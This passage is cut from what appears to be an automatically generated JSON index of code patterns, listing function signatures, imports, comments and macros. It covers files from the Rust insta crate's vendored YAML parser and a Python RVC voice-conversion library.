        "struct_defs": [],
        "impl_blocks": [
          "impl MarkedEventReceiver for YamlLoader {",
          "impl YamlLoader {",
          "impl Yaml {",
          "impl Yaml {",
          "impl Index<usize> for Yaml {",
          "impl IntoIterator for Yaml {",
          "impl Iterator for YamlIter {"
        ],
        "uses": [
          "use crate::content::yaml::vendored::parser::*;",
          "use crate::content::yaml::vendored::scanner::{Marker, ScanError, TScalarStyle, TokenType};",
          "use std::collections::BTreeMap;",
          "use std::f64;",
          "use std::mem;",
          "use std::ops::Index;",
          "use std::string;",
          "use std::vec;",
          "use crate::content::yaml::vendored::yaml::*;",
          "use std::f64;"
        ],
        "macros": [
          "// println!(\"EV {:?}\", ev);",
          "_ => unreachable!(),",
          "// println!(\"DOC {:?}\", self.doc_stack);",
          "_ => unreachable!(),",
          "define_as!(as_bool, bool, Boolean);",
          "define_as!(as_i64, i64, Integer);",
          "define_as_ref!(as_str, &str, String);",
          "define_as_ref!(as_hash, &Hash, Hash);",
          "define_as_ref!(as_vec, &Array, Array);",
          "define_into!(into_bool, bool, Boolean);",
          "define_into!(into_i64, i64, Integer);",
          "define_into!(into_string, String, String);",
          "define_into!(into_hash, Hash, Hash);",
          "define_into!(into_vec, Array, Array);",
          "matches!(*self, Yaml::Null)",
          "matches!(*self, Yaml::BadValue)",
          "matches!(*self, Yaml::Array(_))",
          "assert_eq!(doc[\"a\"].as_i64().unwrap(), 1i64);",
          "assert_eq!(doc[\"b\"].as_f64().unwrap(), 2.2f64);",
          "assert_eq!(doc[\"c\"][1].as_i64().unwrap(), 2i64);",
          "assert!(doc[\"d\"][0].is_badvalue());",
          "assert_eq!(YamlLoader::load_from_str(&s).unwrap()[0], Yaml::Null);",
          "assert_eq!(doc[\"a7\"].as_str().unwrap(), \"\u4f60\u597d\");",
          "assert_eq!(out.len(), 3);",
          "assert_eq!(doc[\"a1\"][\"b2\"], Yaml::BadValue);",
          "assert_eq!(doc.as_str().unwrap(), \"\");",
          "assert_eq!(doc[0].as_str().unwrap(), \"string\");",
          "assert_eq!(doc[1].as_str().unwrap(), \"string\");",
          "assert_eq!(doc[2].as_str().unwrap(), \"string\");",
          "assert_eq!(doc[3].as_i64().unwrap(), 123);",
          "assert_eq!(doc[4].as_i64().unwrap(), -321);",
          "assert_eq!(doc[5].as_f64().unwrap(), 1.23);",
          "assert_eq!(doc[6].as_f64().unwrap(), -1e4);",
          "assert!(doc[7].is_null());",
          "assert!(doc[8].is_null());",
          "assert!(doc[9].as_bool().unwrap());",
          "assert!(!doc[10].as_bool().unwrap());",
          "assert_eq!(doc[11].as_str().unwrap(), \"0\");",
          "assert_eq!(doc[12].as_i64().unwrap(), 100);",
          "assert_eq!(doc[13].as_f64().unwrap(), 2.0);",
          "assert!(doc[14].is_null());",
          "assert!(doc[15].as_bool().unwrap());",
          "assert!(!doc[16].as_bool().unwrap());",
          "assert_eq!(doc[17].as_i64().unwrap(), 255);",
          "assert!(doc[18].is_badvalue());",
          "assert!(doc[19].is_badvalue());",
          "assert!(doc[20].is_badvalue());",
          "assert!(doc[21].is_badvalue());",
          "assert_eq!(doc[22].as_i64().unwrap(), 63);",
          "assert_eq!(doc[23][0].as_i64().unwrap(), 15);",
          "assert_eq!(doc[23][1].as_i64().unwrap(), 15);",
          "assert_eq!(doc[24].as_i64().unwrap(), 12345);",
          "assert!(doc[25][0].as_bool().unwrap());",
          "assert!(!doc[25][1].as_bool().unwrap());",
          "assert!(YamlLoader::load_from_str(s).is_err());",
          "assert!(YamlLoader::load_from_str(b).is_err());",
          "assert!(YamlLoader::load_from_str(\"---This used to cause an infinite loop\").is_o",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(doc.next().unwrap().into_string().unwrap(), \"string\");",
          "assert_eq!(doc.next().unwrap().into_string().unwrap(), \"string\");",
          "assert_eq!(doc.next().unwrap().into_string().unwrap(), \"string\");",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), 123);",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), -321);",
          "assert_eq!(doc.next().unwrap().into_f64().unwrap(), 1.23);",
          "assert_eq!(doc.next().unwrap().into_f64().unwrap(), -1e4);",
          "assert!(doc.next().unwrap().into_bool().unwrap());",
          "assert!(!doc.next().unwrap().into_bool().unwrap());",
          "assert_eq!(doc.next().unwrap().into_string().unwrap(), \"0\");",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), 100);",
          "assert_eq!(doc.next().unwrap().into_f64().unwrap(), 2.0);",
          "assert!(doc.next().unwrap().into_bool().unwrap());",
          "assert!(!doc.next().unwrap().into_bool().unwrap());",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), 255);",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), 63);",
          "assert_eq!(doc.next().unwrap().into_i64().unwrap(), 12345);",
          "assert_eq!(doc.next().unwrap().into_f64().unwrap(), f64::NEG_INFINITY);",
          "assert!(doc.next().unwrap().into_f64().is_some());",
          "assert_eq!(doc.next().unwrap().into_f64().unwrap(), f64::INFINITY);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(None, iter.next());",
          "assert!(first[0][\"important\"].as_bool().unwrap());",
          "assert_eq!(four_spaces, two_spaces);",
          "assert_eq!(two_spaces, one_space);",
          "assert_eq!(four_spaces, mixed_spaces);",
          "println!(\"{doc:#?}\");",
          "assert_eq!(doc[\"subcommands\"][0][\"server\"], Yaml::Null);",
          "assert!(doc[\"subcommands2\"][0][\"server\"].as_hash().is_some());",
          "assert!(doc[\"subcommands3\"][0][\"server\"].as_hash().is_some());",
          "assert!(YamlLoader::load_from_str(&s).is_err());",
          "assert!(YamlLoader::load_from_str(&s).is_err());"
        ],
        "derives": [
          "#[derive(Clone, PartialEq, PartialOrd, Debug, Eq, Ord, Hash)]"
        ],
        "error_handling": 100
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/src/content/yaml/vendored/parser.rs",
        "function_defs": [
          "fn empty_scalar() -> Event {",
          "fn empty_scalar_with_anchor(anchor: usize, tag: Option<TokenType>) -> Event {",
          "fn on_event(&mut self, ev: Event);",
          "fn on_event(&mut self, ev: Event, _mark: Marker);",
          "fn on_event(&mut self, ev: Event, _mark: Marker) {",
          "fn peek_token(&mut self) -> Result<&Token, ScanError> {",
          "fn scan_next_token(&mut self) -> Result<Token, ScanError> {",
          "fn fetch_token(&mut self) -> Token {",
          "fn skip(&mut self) {",
          "fn pop_state(&mut self) {",
          "fn push_state(&mut self, state: State) {",
          "fn parse(&mut self) -> ParseResult {",
          "fn load_document<R: MarkedEventReceiver>(",
          "fn load_node<R: MarkedEventReceiver>(",
          "fn load_mapping<R: MarkedEventReceiver>(&mut self, recv: &mut R) -> Result<(), ScanError> {",
          "fn load_sequence<R: MarkedEventReceiver>(&mut self, recv: &mut R) -> Result<(), ScanError> {",
          "fn state_machine(&mut self) -> ParseResult {",
          "fn stream_start(&mut self) -> ParseResult {",
          "fn document_start(&mut self, implicit: bool) -> ParseResult {",
          "fn parser_process_directives(&mut self) -> Result<(), ScanError> {",
          "fn _explicit_document_start(&mut self) -> ParseResult {",
          "fn document_content(&mut self) -> ParseResult {",
          "fn document_end(&mut self) -> ParseResult {",
          "fn register_anchor(&mut self, name: String, _: &Marker) -> Result<usize, ScanError> {",
          "fn parse_node(&mut self, block: bool, indentless_sequence: bool) -> ParseResult {",
          "fn block_mapping_key(&mut self, first: bool) -> ParseResult {",
          "fn block_mapping_value(&mut self) -> ParseResult {",
          "fn flow_mapping_key(&mut self, first: bool) -> ParseResult {",
          "fn flow_mapping_value(&mut self, empty: bool) -> ParseResult {",
          "fn flow_sequence_entry(&mut self, first: bool) -> ParseResult {",
          "fn indentless_sequence_entry(&mut self) -> ParseResult {",
          "fn block_sequence_entry(&mut self, first: bool) -> ParseResult {",
          "fn flow_sequence_entry_mapping_key(&mut self) -> ParseResult {",
          "fn flow_sequence_entry_mapping_value(&mut self) -> ParseResult {",
          "fn flow_sequence_entry_mapping_end(&mut self) -> ParseResult {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Event {"
        ],
        "uses": [
          "use crate::content::yaml::vendored::scanner::*;",
          "use std::collections::HashMap;"
        ],
        "macros": [
          "// println!(\"EV {:?}\", ev);",
          "assert_eq!(ev, Event::StreamStart);",
          "assert_eq!(first_ev, Event::DocumentStart);",
          "assert_eq!(ev, Event::DocumentEnd);",
          "println!(\"UNREACHABLE EVENT: {first_ev:?}\");",
          "unreachable!();",
          "// println!(\"cur_state {:?}, next tok: {:?}\", self.state, next_tok);",
          "State::End => unreachable!(),",
          "unreachable!()",
          "unreachable!()",
          "unreachable!()",
          "unreachable!()",
          "unreachable!()",
          "unreachable!()"
        ],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Debug, Eq)]",
          "#[derive(Clone, PartialEq, Debug, Eq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 70
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/insta-1.43.2/tests/glob_submodule/mod.rs",
        "function_defs": [
          "fn test_basic_globbing_parent_dir() {",
          "fn test_basic_globbing_nested_parent_dir_base_path() {",
          "fn test_basic_globbing_nested_parent_glob() {",
          "fn test_globs_follow_links_parent_dir_base_path() {",
          "fn test_globs_follow_links_parent_dir_glob() {",
          "fn test_basic_globbing_absolute_dir() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "insta::glob!(\"../inputs\", \"*.txt\", |path| {",
          "insta::assert_json_snapshot!(&contents);",
          "insta::glob!(\"../inputs-nested\", \"*/*.txt\", |path| {",
          "insta::assert_snapshot!(&contents);",
          "insta::glob!(\"..\", \"inputs-nested/*/*.txt\", |path| {",
          "insta::assert_snapshot!(&contents);",
          "insta::glob!(\"../link-to-inputs\", \"*.txt\", |path| {",
          "insta::assert_json_snapshot!(&contents);",
          "insta::glob!(\"..\", \"link-to-inputs/*.txt\", |path| {",
          "insta::assert_json_snapshot!(&contents);",
          "insta::glob!(",
          "concat!(env!(\"CARGO_MANIFEST_DIR\"), \"/tests/inputs\"),",
          "insta::assert_json_snapshot!(&contents);"
        ],
        "derives": [],
        "error_handling": 6
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc",
    "name": "rvc",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from . import ipex",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/synthesizer.py",
        "docstrings": [],
        "function_defs": [
          "def get_synthesizer(cpt: OrderedDict, device=torch.device(\"cpu\")):",
          "def load_synthesizer(",
          "def synthesizer_jit_export("
        ],
        "class_defs": [],
        "imports": [
          "from collections import OrderedDict",
          "from io import BytesIO",
          "import torch",
          "from .layers.synthesizers import SynthesizerTrnMsNSFsid",
          "from .jit import load_inputs, export_jit_model, save_pickle",
          "from rvc.synthesizer import load_synthesizer"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/hubert.py",
        "docstrings": [],
        "function_defs": [
          "def pad_to_multiple(x, multiple, dim=-1, value=0):",
          "def extract_features(",
          "def undo_pad(a, b, c):",
          "def compute_mask_indices(",
          "def arrange(s, e, length, keep_length):",
          "def apply_mask(self, x, padding_mask, target_list):",
          "def get_hubert(model_path=\"assets/hubert/hubert_base.pt\", device=torch.device(\"cpu\")):",
          "def _apply_mask(x, padding_mask, target_list):",
          "def _extract_features(",
          "def hubert_extract_features(",
          "def _hubert_extract_features(",
          "def infer(source, padding_mask, output_layer: torch.Tensor):"
        ],
        "class_defs": [],
        "imports": [
          "import math",
          "import random",
          "from typing import Optional, Tuple",
          "from fairseq.checkpoint_utils import load_model_ensemble_and_task",
          "from fairseq.utils import index_put",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F"
        ],
        "comments": [
          "# @torch.jit.script",
          "# Inspired from https://github.com/lucidrains/local-attention/blob/master/local_attention/local_attention.py#L41",
          "# pad to the sequence length dimension",
          "# B x T x C -> T x B x C",
          "# T x B x C -> B x T x C",
          "# undo paddding",
          "# add a random number for probabilistic rounding",
          "# hubert_model.forward=infer",
          "# hubert_model.forward"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 7,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/transforms.py",
        "docstrings": [],
        "function_defs": [
          "def piecewise_rational_quadratic_transform(",
          "def searchsorted(bin_locations, inputs, eps=1e-6):",
          "def unconstrained_rational_quadratic_spline(",
          "def rational_quadratic_spline("
        ],
        "class_defs": [],
        "imports": [
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch.nn import functional as F"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/nsf.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(self, x: torch.Tensor, upp: int = 1) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, upp: int = 1) -> torch.Tensor:",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):"
        ],
        "class_defs": [
          "class SourceModuleHnNSF(torch.nn.Module):",
          "class NSFGenerator(torch.nn.Module):"
        ],
        "imports": [
          "from typing import Optional, List",
          "import math",
          "import torch",
          "from torch import nn",
          "from torch.nn import Conv1d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, weight_norm",
          "from .generators import SineGenerator",
          "from .residuals import ResBlock1, ResBlock2, LRELU_SLOPE",
          "from .utils import call_weight_data_normal_if_Conv"
        ],
        "comments": [
          "# to produce sine waveforms",
          "# to merge source harmonics into a single excitation",
          "# torch.jit.script() does not support direct indexing of torch modules",
          "# That's why I wrote this",
          "# This assertion cannot be ignored! \\",
          "# If ignored, it will cause torch.jit.script() compilation errors",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/discriminators.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(self, y: torch.Tensor, y_hat: torch.Tensor) -> Tuple[",
          "def forward(self, y: torch.Tensor, y_hat: torch.Tensor) -> Tuple[",
          "def __init__(self, use_spectral_norm: bool = False):",
          "def __call__(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:",
          "def forward(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:",
          "def __init__(",
          "def __call__(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:",
          "def forward(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:"
        ],
        "class_defs": [
          "class MultiPeriodDiscriminator(torch.nn.Module):",
          "class DiscriminatorS(torch.nn.Module):",
          "class DiscriminatorP(torch.nn.Module):"
        ],
        "imports": [
          "from typing import List, Tuple",
          "import torch",
          "from torch import nn",
          "from torch.nn import Conv1d, Conv2d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import spectral_norm, weight_norm",
          "from .residuals import LRELU_SLOPE",
          "from .utils import get_padding"
        ],
        "comments": [
          "# 1d to 2d"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/encoders.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):"
        ],
        "class_defs": [
          "class Encoder(nn.Module):",
          "class TextEncoder(nn.Module):",
          "class PosteriorEncoder(nn.Module):"
        ],
        "imports": [
          "import math",
          "from typing import Tuple, Optional",
          "import torch",
          "from torch import nn",
          "from .attentions import MultiHeadAttention, FFN",
          "from .norms import LayerNorm, WN",
          "from .utils import sequence_mask"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/attentions.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def _attention(",
          "def _matmul_with_relative_values(self, x, y):\n\"\"\"\nx: [b, h, l, m]\ny: [h or 1, m, d]\nret: [b, h, l, d]\n\"\"\"",
          "def _matmul_with_relative_keys(self, x, y):\n\"\"\"\nx: [b, h, l, d]\ny: [h or 1, m, d]\nret: [b, h, l, m]\n\"\"\"",
          "def _get_relative_embeddings(self, relative_embeddings, length: int):",
          "def _relative_position_to_absolute_position(self, x):\n\"\"\"\nx: [b, h, l, 2*l-1]\nret: [b, h, l, l]\n\"\"\"",
          "def _absolute_position_to_relative_position(self, x):\n\"\"\"\nx: [b, h, l, l]\nret: [b, h, l, 2*l-1]\n\"\"\"",
          "def _attention_bias_proximal(self, length: int):\n\"\"\"Bias for self-attention to encourage attention to close positions.\nArgs:\nlength: an integer scalar.\nReturns:\na Tensor with shape [1, 1, length, length]\n\"\"\"",
          "def __init__(",
          "def __call__(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def _padding(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def _causal_padding(self, x):",
          "def _same_padding(self, x):"
        ],
        "class_defs": [
          "class MultiHeadAttention(nn.Module):",
          "class FFN(nn.Module):"
        ],
        "imports": [
          "import math",
          "from typing import Optional",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F"
        ],
        "comments": [
          "# reshape [b, d, t] -> [b, n_h, t, d_k]",
          "# max_relative_position = 2 * self.window_size + 1",
          "# Pad first before slice to avoid using cond ops.",
          "# Concat columns of pad to shift from relative to absolute indexing.",
          "# Concat extra elements so to add up to shape (len+1, 2*len-1).",
          "# Reshape and slice out the padded elements.",
          "# padd along column",
          "# add 0's in the beginning that will skew the elements after reshape",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/generators.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def __prepare_scriptable__(self):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def _f02sine(self, f0: torch.Tensor, upp: int):\n\"\"\"\nf0: (batchsize, length, dim)\n\nwhere dim indicates fundamental tone and overtones\n\"\"\"",
          "def __call__(",
          "def forward(",
          "def _f02uv(self, f0):"
        ],
        "class_defs": [
          "class Generator(torch.nn.Module):",
          "class SineGenerator(torch.nn.Module):"
        ],
        "imports": [
          "from typing import Optional, List, Tuple",
          "import torch",
          "from torch import nn",
          "from torch.nn import Conv1d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, weight_norm",
          "from .residuals import ResBlock1, ResBlock2, LRELU_SLOPE",
          "from .utils import call_weight_data_normal_if_Conv"
        ],
        "comments": [
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# generate uv signal"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/residuals.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):"
        ],
        "class_defs": [
          "class ResBlock1(torch.nn.Module):",
          "class ResBlock2(torch.nn.Module):",
          "class ResidualCouplingLayer(nn.Module):",
          "class ResidualCouplingBlock(nn.Module):",
          "class Flip(nn.Module):"
        ],
        "imports": [
          "from typing import Optional, List, Tuple",
          "import torch",
          "from torch import nn",
          "from torch.nn import Conv1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, weight_norm",
          "from .norms import WN",
          "from .utils import ("
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/utils.py",
        "docstrings": [],
        "function_defs": [
          "def call_weight_data_normal_if_Conv(m: torch.nn.Module):",
          "def get_padding(kernel_size: int, dilation=1) -> int:",
          "def slice_on_last_dim(",
          "def rand_slice_segments_on_last_dim(",
          "def activate_add_tanh_sigmoid_multiply(",
          "def sequence_mask(",
          "def total_grad_norm("
        ],
        "class_defs": [],
        "imports": [
          "from typing import List, Optional, Tuple, Iterator",
          "import torch"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.script"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/synthesizers.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def infer(",
          "def __init__(",
          "def __init__(",
          "def __init__(",
          "def __init__("
        ],
        "class_defs": [
          "class SynthesizerTrnMsNSFsid(nn.Module):",
          "class SynthesizerTrnMs256NSFsid(SynthesizerTrnMsNSFsid):",
          "class SynthesizerTrnMs768NSFsid(SynthesizerTrnMsNSFsid):",
          "class SynthesizerTrnMs256NSFsid_nono(SynthesizerTrnMsNSFsid):",
          "class SynthesizerTrnMs768NSFsid_nono(SynthesizerTrnMsNSFsid):"
        ],
        "imports": [
          "from typing import Optional, List, Union",
          "import torch",
          "from torch import nn",
          "from .encoders import TextEncoder, PosteriorEncoder",
          "from .generators import Generator",
          "from .nsf import NSFGenerator",
          "from .residuals import ResidualCouplingBlock",
          "from .utils import ("
        ],
        "comments": [
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# print(1,pitch.shape)#[bs,t]"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.ignore",
          "@torch.jit.export"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/norms.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, channels: int, eps: float = 1e-5):",
          "def forward(self, x: torch.Tensor):",
          "def __init__(",
          "def __call__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):"
        ],
        "class_defs": [
          "class LayerNorm(nn.Module):",
          "class WN(torch.nn.Module):"
        ],
        "imports": [
          "from typing import Optional",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F",
          "from .utils import activate_add_tanh_sigmoid_multiply"
        ],
        "comments": [
          "# last one is not necessary"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/onnx/exporter.py",
        "docstrings": [],
        "function_defs": [
          "def export_onnx(from_cpkt_pth: str, to_onnx_pth: str) -> str:"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "from .synthesizer import SynthesizerTrnMsNSFsid"
        ],
        "comments": [
          "# net_g.construct_spkmixmap() #\u591a\u89d2\u8272\u6df7\u5408\u8f68\u9053\u5bfc\u51fa"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/onnx/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .infer import RVC",
          "from .exporter import export_onnx"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/onnx/synthesizer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def remove_weight_norm(self):",
          "def construct_spkmixmap(self):",
          "def forward(self, phone, phone_lengths, pitch, nsff0, g, rnd, max_len=None):"
        ],
        "class_defs": [
          "class SynthesizerTrnMsNSFsid(SynthesizerBase):"
        ],
        "imports": [
          "from typing import List, Optional, Union",
          "import torch",
          "from rvc.layers.synthesizers import SynthesizerTrnMsNSFsid as SynthesizerBase"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/onnx/infer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __init__(",
          "def __call__(self, wav: np.ndarray[typing.Any, np.dtype]):",
          "def forward(self, wav: np.ndarray[typing.Any, np.dtype]):",
          "def __init__(",
          "def infer(",
          "def forward("
        ],
        "class_defs": [
          "class Model:",
          "class ContentVec(Model):",
          "class RVC(Model):"
        ],
        "imports": [
          "import typing",
          "import os",
          "import librosa",
          "import numpy as np",
          "import onnxruntime",
          "from rvc.f0 import Generator"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/jit/jit.py",
        "docstrings": [],
        "function_defs": [
          "def load_pickle(path: str):",
          "def save_pickle(ckpt: dict, save_path: str):",
          "def load_inputs(path: str | BytesIO, device: str, is_half=False):",
          "def export_jit_model(",
          "def get_jit_model(model_path: str, is_half: bool, device: str, exporter):"
        ],
        "class_defs": [],
        "imports": [
          "import pickle",
          "from io import BytesIO",
          "from collections import OrderedDict",
          "import os",
          "import torch"
        ],
        "comments": [
          "# model_jit=model_jit.cpu()"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/jit/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .jit import load_inputs, get_jit_model, export_jit_model, save_pickle"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/ipex/attention.py",
        "docstrings": [],
        "function_defs": [
          "def torch_bmm(input, mat2, *, out=None):",
          "def scaled_dot_product_attention(",
          "def attention_init():"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# ARC GPUs can't allocate more than 4GB to a single block, Slice it:",
          "# Find something divisible with the input_tokens",
          "# Find something divisible with the input_tokens",
          "# ARC GPUs can't allocate more than 4GB to a single block, Slice it:",
          "# Find something divisible with the shape_one",
          "# Find something divisible with the batch_size_attention",
          "# ARC GPUs can't allocate more than 4GB to a single block:"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
